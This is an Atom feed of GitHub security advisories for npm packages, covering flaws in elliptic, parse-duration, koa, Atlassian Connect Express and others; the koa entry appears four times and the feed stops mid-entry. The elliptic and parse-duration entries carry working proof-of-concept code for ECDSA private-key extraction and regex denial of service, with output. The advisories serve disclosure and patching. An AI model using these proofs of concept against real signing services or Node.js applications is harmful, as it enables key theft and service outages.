<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-02-14T17:01:15.656Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[atlassian-connect-express] Broken Authentication in Atlassian Connect Express]]></title>
        <id>https://github.com/advisories/GHSA-4v96-m8xv-x83v</id>
        <link href="https://github.com/advisories/GHSA-4v96-m8xv-x83v"/>
        <updated>2025-02-12T21:53:05.000Z</updated>
        <content type="html"><![CDATA[<p>Broken Authentication in Atlassian Connect Express (ACE) from version 3.0.2 before version 6.6.0: Atlassian Connect Express is a Node.js package for building Atlassian Connect apps. Authentication between Atlassian products and the Atlassian Connect Express app occurs with a server-to-server JWT or a context JWT. Atlassian Connect Express versions between 3.0.2 - 6.5.0 erroneously accept context JWTs in lifecycle endpoints (such as installation) where only server-to-server JWTs should be accepted, permitting an attacker to send authenticated re-installation events to an app.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26073">https://nvd.nist.gov/vuln/detail/CVE-2021-26073</a></li>
<li><a href="https://confluence.atlassian.com/pages/viewpage.action?pageId=1051986099">https://confluence.atlassian.com/pages/viewpage.action?pageId=1051986099</a></li>
<li><a href="https://community.developer.atlassian.com/t/action-required-atlassian-connect-vulnerability-a%5B%E2%80%A6%5Dypass-of-app-qsh-verification-via-context-jwts/47072">https://community.developer.atlassian.com/t/action-required-atlassian-connect-vulnerability-a%5B%E2%80%A6%5Dypass-of-app-qsh-verification-via-context-jwts/47072</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210604-0004">https://security.netapp.com/advisory/ntap-20210604-0004</a></li>
<li><a href="https://github.com/advisories/GHSA-4v96-m8xv-x83v">https://github.com/advisories/GHSA-4v96-m8xv-x83v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v96-m8xv-x83v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T22:28:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string)]]></title>
        <id>https://github.com/advisories/GHSA-vjh7-7g9h-fjfh</id>
        <link href="https://github.com/advisories/GHSA-vjh7-7g9h-fjfh"/>
        <updated>2025-02-12T19:47:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Private key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input</p>
<p>Note that <code>elliptic</code> by design accepts hex strings as one of the possible input types</p>
<h3 id="details">Details</h3>
<p>In this code: <a href="https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107">https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107</a></p>
<p><code>msg</code> is a BN instance after conversion, but <code>nonce</code> is an array, and different BN instances could generate equivalent arrays after conversion.</p>
<p>Meaning that a same <code>nonce</code> could be generated for different messages used in signing process, leading to <code>k</code> reuse, leading to private key extraction from a pair of signatures</p>
<p>Such a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction</p>
<p>While signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still <em>should not</em> leak the private key</p>
<p>Also, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain</p>
<h3 id="poc">PoC</h3>
<h4 id="k-reuse-example"><code>k</code> reuse example</h4>
<pre><code class="language-js">import elliptic from 'elliptic'

const { ec: EC } = elliptic

const privateKey = crypto.getRandomValues(new Uint8Array(32))
const curve = 'ed25519' // or any other curve, e.g. secp256k1
const ec = new EC(curve)
const prettyprint = ({ r, s }) =&gt; `r: ${r}, s: ${s}`
const sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones
const sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form
const sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`
console.log({ sig0, sig1, sig2 })
</code></pre>
<h4 id="full-attack">Full attack</h4>
<p>This doesn't include code for generation/recovery on a purpose (bit it's rather trivial)</p>
<pre><code class="language-js">import elliptic from 'elliptic'

const { ec: EC } = elliptic

const privateKey = crypto.getRandomValues(new Uint8Array(32))
const curve = 'secp256k1' // or any other curve, e.g. ed25519
const ec = new EC(curve)

// Any message, e.g. previously known signature
const msg0 = crypto.getRandomValues(new Uint8Array(32))
const sig0 = ec.sign(msg0, privateKey)

// Attack
const msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types
const sig1 = ec.sign(msg1, privateKey)

const something = extract(msg0, sig0, sig1, curve)

console.log('Curve:', curve)
console.log('Typeof:', typeof msg1)
console.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)
const rnd = crypto.getRandomValues(new Uint8Array(32))
const st = (x) =&gt; JSON.stringify(x)
console.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))
console.log('Orig key:', Buffer.from(privateKey).toString('hex'))
console.log('Restored:', something)
</code></pre>
<p>Output:</p>
<pre><code class="language-console">Curve: secp256k1
Typeof: string
Keys equal? true
Keys equivalent? true
Orig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
Restored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
</code></pre>
<p>Similar for <code>ed25519</code>, but due to low <code>n</code>, the key might not match precisely but is nevertheless equivalent for signing:</p>
<pre><code class="language-console">Curve: ed25519
Typeof: string
Keys equal? false
Keys equivalent? true
Orig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189
Restored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6
</code></pre>
<p><code>restored</code> is equal to <code>orig</code> mod <code>N</code>.</p>
<h3 id="impact">Impact</h3>
<p>Full private key extraction when signing a single malicious message (that passes <code>JSON.stringify</code>/<code>JSON.parse</code>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh">https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/04cb6f54ce552b3ebde6be06d6050419e1c7333e">https://github.com/indutny/elliptic/commit/04cb6f54ce552b3ebde6be06d6050419e1c7333e</a></li>
<li><a href="https://github.com/advisories/GHSA-vjh7-7g9h-fjfh">https://github.com/advisories/GHSA-vjh7-7g9h-fjfh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjh7-7g9h-fjfh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-12T19:47:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-duration] parse-duration has a Regex Denial of Service that results in event loop delay and out of memory]]></title>
        <id>https://github.com/advisories/GHSA-hcrg-fc28-fcg5</id>
        <link href="https://github.com/advisories/GHSA-hcrg-fc28-fcg5"/>
        <updated>2025-02-12T21:35:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report finds 2 availability issues due to the regex used in the <code>parse-duration</code> npm package:</p>
<ol>
<li>An event loop delay due to the CPU-bound operation of resolving the provided string, from a 0.5ms and up to ~50ms per one operation, with a varying size from 0.01 MB and up to 4.3 MB respectively.</li>
<li>An out of memory that would crash a running Node.js application due to a string size of roughly 10 MB that utilizes unicode characters.</li>
</ol>
<h3 id="poc">PoC</h3>
<p>Refer to the following proof of concept code that provides a test case and makes use of the regular expression in the library as its test case to match against strings:</p>
<pre><code class="language-js">// Vulnerable regex to use from the library:
import parse from './index.js'

function generateStressTestString(length, decimalProbability) {
  let result = "";
  for (let i = 0; i &lt; length; i++) {
    if (Math.random() &lt; decimalProbability) {
      result += "....".repeat(99);
    }
    result += Math.floor(Math.random() * 10);
  }
  return result;
}

function getStringSizeInMB_UTF8(str) {
  const sizeInBytes = Buffer.byteLength(str, 'utf8');
  const sizeInMB = sizeInBytes / (1024 * 1024);
  return sizeInMB;
}


// Generate test strings with varying length and decimal probability:
const longString1 = generateStressTestString(380, 0.05);
const longString2 = generateStressTestString(10000, 0.9);
const longString3 = generateStressTestString(500000, 1);
const longStringVar1 = '-1e' + '-----'.repeat(915000)
const longStringVar2 = "1" + "0".repeat(500) + "e1" + "α".repeat(5225000)

function testRegex(str) {
  const startTime = performance.now();
  // one of the regex's used in the library:
  // const durationRE = /(-?(?:\d+\.?\d*|\d*\.?\d+)(?:e[-+]?\d+)?)\s*([\p{L}]*)/giu;
  // const match = durationRE.test(str);
  // but we will use the exported library code directly:
  const match = parse(str);
  const endTime = performance.now();
  const timeTaken = endTime - startTime;
  return { timeTaken, match };
}

// Test the long strings:
let result = {}

{
  console.log(
    `\nRegex test on string of length ${longString1.length} (size: ${getStringSizeInMB_UTF8(longString1).toFixed(2)} MB):`
  );
  result = testRegex(longString1);
  console.log(
    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`
  );
}

{
  console.log(
    `\nRegex test on string of length ${longString2.length} (size: ${getStringSizeInMB_UTF8(longString2).toFixed(2)} MB):`
  );
  result = testRegex(longString2 + "....".repeat(100) + "5сек".repeat(9000));
  console.log(
    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`
  );
}

{
  console.log(
    `\nRegex test on string of length ${longStringVar1.length} (size: ${getStringSizeInMB_UTF8(longStringVar1).toFixed(2)} MB):`
  );
  result = testRegex(longStringVar1);
  console.log(
    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`
  );
}


{
  console.log(
    `\nRegex test on string of length ${longString3.length} (size: ${getStringSizeInMB_UTF8(longString3).toFixed(2)} MB):`
  );
  result = testRegex(longString3 + '.'.repeat(10000) + " 5сек".repeat(9000));
  console.log(
    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`
  );
}

{
  console.log(
    `\nRegex test on string of length ${longStringVar2.length} (size: ${getStringSizeInMB_UTF8(longStringVar2).toFixed(2)} MB):`
  );
  result = testRegex(longStringVar2);
  console.log(
    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`
  );
}
</code></pre>
<p>The results of this on the cloud machine that I ran this on are as follows:</p>
<pre><code class="language-sh">@lirantal ➜ /workspaces/parse-duration (master) $ node redos.js 

Regex test on string of length 6320 (size: 0.01 MB):
   matched: 5997140778.000855, time taken: 0.9271340000000237ms

Regex test on string of length 3561724 (size: 3.40 MB):
   matched: 0.0006004999999999999, time taken: 728.7693149999999ms

Regex test on string of length 4575003 (size: 4.36 MB):
   matched: null, time taken: 43.713984999999866ms

Regex test on string of length 198500000 (size: 189.30 MB):

&lt;--- Last few GCs ---&gt;

[34339:0x7686430]    14670 ms: Mark-Compact (reduce) 2047.4 (2073.3) -&gt; 2047.4 (2074.3) MB, 1396.70 / 0.01 ms  (+ 0.1 ms in 62 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 1430 ms) (average mu = 0.412, current mu = 0.[34339:0x7686430]    17450 ms: Mark-Compact (reduce) 2048.4 (2074.3) -&gt; 2048.4 (2075.3) MB, 2777.68 / 0.00 ms  (average mu = 0.185, current mu = 0.001) allocation failure; scavenge might not succeed


&lt;--- JS stacktrace ---&gt;

FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
----- Native stack trace -----

 1: 0xb8d0a3 node::OOMErrorHandler(char const*, v8::OOMDetails const&amp;) [node]
 2: 0xf06250 v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, v8::OOMDetails const&amp;) [node]
 3: 0xf06537 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, v8::OOMDetails const&amp;) [node]
 4: 0x11180d5  [node]
 5: 0x112ff58 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]
 6: 0x1106071 v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]
 7: 0x1107205 v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]
 8: 0x10e4856 v8::internal::Factory::NewFillerObject(int, v8::internal::AllocationAlignment, v8::internal::AllocationType, v8::internal::AllocationOrigin) [node]
 9: 0x1540686 v8::internal::Runtime_AllocateInYoungGeneration(int, unsigned long*, v8::internal::Isolate*) [node]
10: 0x1979ef6  [node]
Aborted (core dumped)
</code></pre>
<p>You can note that:</p>
<ol>
<li>0.01 MB of input was enough to cause a 1ms delay (0.92ms)</li>
<li>Ranging from either 3 MB to 4 MB of input results in almost a full second day (728ms) and 42 ms, depending on the characters used in the text passed to the library's <code>parse()</code> function</li>
<li>A 200 MB of input size already causes JavaScript heap out of memory crash</li>
</ol>
<p>However, more interestingly, if we focus on the input string case:</p>
<pre><code class="language-js">const longStringVar2 = "1" + "0".repeat(500) + "e1" + "α".repeat(5225000)
</code></pre>
<p>Even though this is merely 10 MB of size (9.97 MB) it results in an out of memory issue due to the recursive nature of the regular expression matching:</p>
<pre><code class="language-sh">Regex test on string of length 5225503 (size: 9.97 MB):
file:///workspaces/parse-duration/index.js:21
    .replace(durationRE, (_, n, units) =&gt; {
     ^

RangeError: Maximum call stack size exceeded
    at String.replace (&lt;anonymous&gt;)
    at parse (file:///workspaces/parse-duration/index.js:21:6)
    at testRegex (file:///workspaces/parse-duration/redos.js:35:17)
    at file:///workspaces/parse-duration/redos.js:89:12
    at ModuleJob.run (node:internal/modules/esm/module_job:234:25)
    at async ModuleLoader.import (node:internal/modules/esm/loader:473:24)
    at async asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:122:5)

Node.js v20.18.1
</code></pre>
<p>To note, the issue at hand may not just be the primary regex in use but rather the reliance of the various <code>replace</code> functions in the <code>parse()</code> function which create copies of the input in memory.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>I agree, a 200 MB (perhaps even less if we perform more tests to find the actual threshold) is a large amount of data to send over a network and hopefully is unlikely to hit common application usage.</li>
<li>In the case of the specialized input string case that uses a UTF-8 character it is only requires up to 10 MB of request size to cause a RangeError exception for a running Node.js application, which I think is more applicable and common to allow such input sizes for POST requests and other types.</li>
<li>Even for the smaller payloads such as 0.01 MB which aligns with Express's default of 100kb request limit size it causes a 1ms delay. Now imagine if an application is running without proper security controls such as rate limits, and attackers send 1000s of concurrent requests which quickly turn the 1ms delay into seconds worth of delay for a running application. The 3 MB payload already shows a 0.5s delay in one request.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jkroso/parse-duration/security/advisories/GHSA-hcrg-fc28-fcg5">https://github.com/jkroso/parse-duration/security/advisories/GHSA-hcrg-fc28-fcg5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25283">https://nvd.nist.gov/vuln/detail/CVE-2025-25283</a></li>
<li><a href="https://github.com/jkroso/parse-duration/commit/9e88421bfd41806fa4b473bfb28a9ee9dafc27d7">https://github.com/jkroso/parse-duration/commit/9e88421bfd41806fa4b473bfb28a9ee9dafc27d7</a></li>
<li><a href="https://github.com/jkroso/parse-duration/releases/tag/v2.1.3">https://github.com/jkroso/parse-duration/releases/tag/v2.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hcrg-fc28-fcg5">https://github.com/advisories/GHSA-hcrg-fc28-fcg5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcrg-fc28-fcg5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-12T19:45:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[koa] Inefficient Regular Expression Complexity in koa]]></title>
        <id>https://github.com/advisories/GHSA-593f-38f6-jp5m</id>
        <link href="https://github.com/advisories/GHSA-593f-38f6-jp5m"/>
        <updated>2025-02-12T19:23:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Koa uses an evil regex to parse the <code>X-Forwarded-Proto</code> and <code>X-Forwarded-Host</code> HTTP headers. This can be exploited to carry out a Denial-of-Service attack.</p>
<h3 id="poc">PoC</h3>
<p>Coming soon.</p>
<h3 id="impact">Impact</h3>
<p>This is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m">https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25200">https://nvd.nist.gov/vuln/detail/CVE-2025-25200</a></li>
<li><a href="https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c">https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c</a></li>
<li><a href="https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32">https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32</a></li>
<li><a href="https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08">https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08</a></li>
<li><a href="https://github.com/koajs/koa/releases/tag/2.15.4">https://github.com/koajs/koa/releases/tag/2.15.4</a></li>
<li><a href="https://github.com/advisories/GHSA-593f-38f6-jp5m">https://github.com/advisories/GHSA-593f-38f6-jp5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-593f-38f6-jp5m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-12T19:23:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[koa] Inefficient Regular Expression Complexity in koa]]></title>
        <id>https://github.com/advisories/GHSA-593f-38f6-jp5m</id>
        <link href="https://github.com/advisories/GHSA-593f-38f6-jp5m"/>
        <updated>2025-02-12T19:23:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Koa uses an evil regex to parse the <code>X-Forwarded-Proto</code> and <code>X-Forwarded-Host</code> HTTP headers. This can be exploited to carry out a Denial-of-Service attack.</p>
<h3 id="poc">PoC</h3>
<p>Coming soon.</p>
<h3 id="impact">Impact</h3>
<p>This is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m">https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25200">https://nvd.nist.gov/vuln/detail/CVE-2025-25200</a></li>
<li><a href="https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c">https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c</a></li>
<li><a href="https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32">https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32</a></li>
<li><a href="https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08">https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08</a></li>
<li><a href="https://github.com/koajs/koa/releases/tag/2.15.4">https://github.com/koajs/koa/releases/tag/2.15.4</a></li>
<li><a href="https://github.com/advisories/GHSA-593f-38f6-jp5m">https://github.com/advisories/GHSA-593f-38f6-jp5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-593f-38f6-jp5m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-12T19:23:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[koa] Inefficient Regular Expression Complexity in koa]]></title>
        <id>https://github.com/advisories/GHSA-593f-38f6-jp5m</id>
        <link href="https://github.com/advisories/GHSA-593f-38f6-jp5m"/>
        <updated>2025-02-12T19:23:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Koa uses an evil regex to parse the <code>X-Forwarded-Proto</code> and <code>X-Forwarded-Host</code> HTTP headers. This can be exploited to carry out a Denial-of-Service attack.</p>
<h3 id="poc">PoC</h3>
<p>Coming soon.</p>
<h3 id="impact">Impact</h3>
<p>This is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m">https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25200">https://nvd.nist.gov/vuln/detail/CVE-2025-25200</a></li>
<li><a href="https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c">https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c</a></li>
<li><a href="https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32">https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32</a></li>
<li><a href="https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08">https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08</a></li>
<li><a href="https://github.com/koajs/koa/releases/tag/2.15.4">https://github.com/koajs/koa/releases/tag/2.15.4</a></li>
<li><a href="https://github.com/advisories/GHSA-593f-38f6-jp5m">https://github.com/advisories/GHSA-593f-38f6-jp5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-593f-38f6-jp5m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-12T19:23:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[koa] Inefficient Regular Expression Complexity in koa]]></title>
        <id>https://github.com/advisories/GHSA-593f-38f6-jp5m</id>
        <link href="https://github.com/advisories/GHSA-593f-38f6-jp5m"/>
        <updated>2025-02-12T19:23:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Koa uses an evil regex to parse the <code>X-Forwarded-Proto</code> and <code>X-Forwarded-Host</code> HTTP headers. This can be exploited to carry out a Denial-of-Service attack.</p>
<h3 id="poc">PoC</h3>
<p>Coming soon.</p>
<h3 id="impact">Impact</h3>
<p>This is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m">https://github.com/koajs/koa/security/advisories/GHSA-593f-38f6-jp5m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25200">https://nvd.nist.gov/vuln/detail/CVE-2025-25200</a></li>
<li><a href="https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c">https://github.com/koajs/koa/commit/5054af6e31ffd451a4151a1fe144cef6e5d0d83c</a></li>
<li><a href="https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32">https://github.com/koajs/koa/commit/5f294bb1c7c8d9c61904378d250439a321bffd32</a></li>
<li><a href="https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08">https://github.com/koajs/koa/commit/93fe903fc966635a991bcf890cfc3427d33a1a08</a></li>
<li><a href="https://github.com/koajs/koa/releases/tag/2.15.4">https://github.com/koajs/koa/releases/tag/2.15.4</a></li>
<li><a href="https://github.com/advisories/GHSA-593f-38f6-jp5m">https://github.com/advisories/GHSA-593f-38f6-jp5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-593f-38f6-jp5m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-12T19:23:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[css-what] Denial of service in css-what]]></title>
        <id>https://github.com/advisories/GHSA-q8pj-2vqx-8ggc</id>
        <link href="https://github.com/advisories/GHSA-q8pj-2vqx-8ggc"/>
        <updated>2025-02-12T05:11:27.000Z</updated>
        <content type="html"><![CDATA[<p>The css-what package 4.0.0 through 5.0.0 for Node.js does not ensure that attribute parsing has Linear Time Complexity relative to the size of the input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33587">https://nvd.nist.gov/vuln/detail/CVE-2021-33587</a></li>
<li><a href="https://github.com/fb55/css-what/commit/4cdaacfd0d4b6fd00614be030da0dea6c2994655">https://github.com/fb55/css-what/commit/4cdaacfd0d4b6fd00614be030da0dea6c2994655</a></li>
<li><a href="https://github.com/fb55/css-what/releases/tag/v5.0.1">https://github.com/fb55/css-what/releases/tag/v5.0.1</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210706-0007/">https://security.netapp.com/advisory/ntap-20210706-0007/</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/03/msg00001.html">https://lists.debian.org/debian-lts-announce/2023/03/msg00001.html</a></li>
<li><a href="https://github.com/advisories/GHSA-q8pj-2vqx-8ggc">https://github.com/advisories/GHSA-q8pj-2vqx-8ggc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8pj-2vqx-8ggc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-06-07T22:11:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bson] Deserialization of Untrusted Data in bson]]></title>
        <id>https://github.com/advisories/GHSA-v8w9-2789-6hhr</id>
        <link href="https://github.com/advisories/GHSA-v8w9-2789-6hhr"/>
        <updated>2025-02-12T05:11:27.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of bson before 1.1.4 are vulnerable to Deserialization of Untrusted Data. The package will ignore an unknown value for an object's _bsontype, leading to cases where an object is serialized as a document rather than the intended BSON type.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7610">https://nvd.nist.gov/vuln/detail/CVE-2020-7610</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-BSON-561052">https://snyk.io/vuln/SNYK-JS-BSON-561052</a></li>
<li><a href="https://github.com/mongodb/js-bson/commit/3809c1313a7b2a8001065f0271199df9fa3d16a8">https://github.com/mongodb/js-bson/commit/3809c1313a7b2a8001065f0271199df9fa3d16a8</a></li>
<li><a href="https://github.com/advisories/GHSA-v8w9-2789-6hhr">https://github.com/advisories/GHSA-v8w9-2789-6hhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8w9-2789-6hhr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-05-07T16:04:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Prototype Pollution in node-forge]]></title>
        <id>https://github.com/advisories/GHSA-92xj-mqp7-vmcj</id>
        <link href="https://github.com/advisories/GHSA-92xj-mqp7-vmcj"/>
        <updated>2025-02-12T05:11:27.000Z</updated>
        <content type="html"><![CDATA[<p>The package node-forge before 0.10.0 is vulnerable to Prototype Pollution via the util.setPath function. Note: version 0.10.0 is a breaking change removing the vulnerable functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7720">https://nvd.nist.gov/vuln/detail/CVE-2020-7720</a></li>
<li><a href="https://github.com/digitalbazaar/forge/blob/master/CHANGELOG.md">https://github.com/digitalbazaar/forge/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/digitalbazaar/forge/blob/master/CHANGELOG.md#removed">https://github.com/digitalbazaar/forge/blob/master/CHANGELOG.md#removed</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-NODEFORGE-598677">https://snyk.io/vuln/SNYK-JS-NODEFORGE-598677</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/6a1e3ef74f6eb345bcff1b82184201d1e28b6756">https://github.com/digitalbazaar/forge/commit/6a1e3ef74f6eb345bcff1b82184201d1e28b6756</a></li>
